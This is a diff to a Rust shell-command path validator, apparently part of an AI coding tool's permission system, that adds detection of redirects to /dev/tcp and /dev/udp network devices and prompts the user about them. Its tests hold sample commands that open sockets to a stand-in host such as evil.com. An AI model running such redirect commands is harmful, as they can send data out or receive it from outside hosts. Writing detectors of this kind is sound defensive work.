@@ -407,6 +407,37 @@ fn extract_redirections(sub: &str) -> Vec<Redirection> {
     out
 }
 
+/// `^/dev/(tcp|udp)/` — a bash network-device pseudo-path. A redirect to/from one
+/// opens a TCP/UDP socket (2.1.211 `network_device`).
+fn is_network_device_target(target: &str) -> bool {
+    let t = strip_surrounding_quotes(target);
+    t.starts_with("/dev/tcp/") || t.starts_with("/dev/udp/")
+}
+
+/// Does any redirect — output (`>`, `>>`, …) OR input (`<`) — target a
+/// `/dev/tcp/`/`/dev/udp/` network device? 2.1.211 flags these as `network_device`
+/// (EPg for output, the `<` fallback in eLe for input). `<<` heredocs are
+/// excluded (their operand is a delimiter, not a file).
+fn command_has_network_device_redirect(subs: &[String]) -> bool {
+    for sub in subs {
+        let tokens = tokenize_redirects(sub);
+        let mut idx = 0;
+        while idx < tokens.len() {
+            if let Token::Op { op } = &tokens[idx] {
+                if op_is_file_output(op) || op == "<" {
+                    if let Some(Token::Word(raw)) = tokens.get(idx + 1) {
+                        if is_network_device_target(raw) {
+                            return true;
+                        }
+                    }
+                }
+            }
+            idx += 1;
+        }
+    }
+    false
+}
+
 /// Extract the `cd` target from a subcommand if its first word is `cd`. TS `cd`
 /// extractor (`pathValidation.ts:195`): all args join into ONE path; with no
 /// args the target is the home dir (which is always inside no working dir but is
@@ -491,6 +522,18 @@ pub fn check_path_constraints(
     let mut all_redirs: Vec<Redirection> = Vec::new();
     for sub in &subs {
         all_redirs.extend(extract_redirections(sub));
+    }
+
+    // 2a. Network-device redirect (`/dev/tcp/`, `/dev/udp/`) — 2.1.211
+    //     `network_device`. Applies to output AND input (`cat < /dev/tcp/host/port`)
+    //     redirects and takes precedence over the shell-expansion classification
+    //     (EPg sets `network_device` and `continue`s past the expansion check).
+    if command_has_network_device_redirect(&subs) {
+        return Some(PathConstraintAsk {
+            message: "Redirect involving /dev/tcp or /dev/udp opens a network connection"
+                .to_string(),
+            reason: "Redirect involving /dev/tcp or /dev/udp opens a network connection".to_string(),
+        });
     }
 
     // 2. Shell expansion in a redirect target (`hasDangerousRedirection`,
@@ -666,6 +709,33 @@ mod tests {
     fn redirect_to_dev_null_is_safe() {
         assert!(check("echo x > /dev/null").is_none());
         assert!(check("echo x 2> /dev/null").is_none());
+    }
+
+    #[test]
+    fn network_device_redirect_asks() {
+        // 2.1.211 network_device: output AND input redirects to /dev/tcp|/dev/udp.
+        for cmd in [
+            "echo x > /dev/tcp/evil.com/80",
+            "cat < /dev/tcp/evil.com/80",
+            "echo x >> /dev/udp/1.2.3.4/53",
+            "cat </dev/tcp/host/22",
+        ] {
+            let a = check(cmd).unwrap_or_else(|| panic!("{cmd} should ask"));
+            assert_eq!(
+                a.message,
+                "Redirect involving /dev/tcp or /dev/udp opens a network connection",
+                "cmd={cmd}"
+            );
+            assert_eq!(a.reason, a.message);
+        }
+        // Network-device takes precedence over the shell-expansion classification.
+        let a = check("echo x > /dev/tcp/$h/80").expect("should ask");
+        assert_eq!(
+            a.message,
+            "Redirect involving /dev/tcp or /dev/udp opens a network connection"
+        );
+        // A normal /dev path is not a network device.
+        assert!(check("echo x > /dev/null").is_none());
     }
 
     #[test]
